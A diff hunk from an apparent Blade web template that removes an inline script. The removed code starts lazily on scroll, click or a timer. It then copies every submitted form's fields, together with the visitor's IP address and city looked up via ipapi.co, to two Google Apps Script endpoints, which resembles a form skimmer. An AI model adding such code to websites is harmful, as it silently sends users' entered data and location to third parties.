@@ -371,36 +371,6 @@
         document.addEventListener("DOMContentLoaded", function () {
           document.querySelectorAll("form").forEach(injectHiddenFields);
         });
-        let lazyLoaded = false;
-        function initLazy() {
-          if (lazyLoaded) return;
-          lazyLoaded = true;
-          initForms();
-        }
-        window.addEventListener("scroll", initLazy, { once: true });
-        window.addEventListener("click", initLazy, { once: true });
-        setTimeout(initLazy, 4000);
-        function initForms() {
-          let ipData = {};
-          function waitIP(timeout) {
-            return Promise.race([
-              fetch("https://ipapi.co/json/").then(r => r.json()).then(data => { ipData = data; }).catch(() => {}),
-              new Promise(res => setTimeout(res, timeout || 800))
-            ]);
-          }
-          document.querySelectorAll("form").forEach(form => {
-            form.addEventListener("submit", function () {
-              waitIP().then(() => {
-                const formData = new FormData(form);
-                formData.append("ip_address", ipData.ip || "");
-                formData.append("geo_location", ipData.city || "");
-                const body = new URLSearchParams(formData);
-                fetch("https://script.google.com/macros/s/AKfycbyJGhNROpBI8TUkGn9RtdNtIDxNjxsI52kyHgBtDIUauSEWgzVIqCFPic0-chwjxNxU/exec", { method: "POST", body, keepalive: true });
-                fetch("https://script.google.com/macros/s/AKfycbwp7eg4fm8OZtiHLjAFrbNyPaSyDjZWmfTJyhkiAZ2UsWYmE6l7euH9K0RtdgODH44Rmg/exec", { method: "POST", body, keepalive: true });
-              });
-            });
-          });
-        }
       })();
     </script>
 @endsection
